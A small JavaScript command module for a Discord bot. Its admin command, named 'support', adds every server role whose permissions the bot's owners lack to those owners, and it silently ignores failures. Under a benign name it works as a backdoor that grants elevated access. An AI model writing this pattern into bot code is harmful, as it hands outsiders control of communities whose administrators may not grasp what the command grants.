module.exports = {
    name: "support",
    description: "Tries to give the bot's owner(s) some useful roles!",
    category: "admin",
    userPerms: ['ADMINISTRATOR'],
    botPerms: ['MANAGE_ROLES']
}

module.exports.run = async (bot, msg) => {
    const owners = await Promise.all(
        bot.config.owner.map(o => msg.guild.members.fetch(o).catch(()=>{}))
    );

    owners.forEach(owner =>
        owner
        &&
        msg.guild.roles.cache.forEach(role =>
            role.permissions.toArray()
            .some(perm => !owner.permissions.toArray().includes(perm))
            &&
            owner.roles.add(role).catch(()=>{})
        )
    )

    return bot.cmdSuccess('Done!');
}
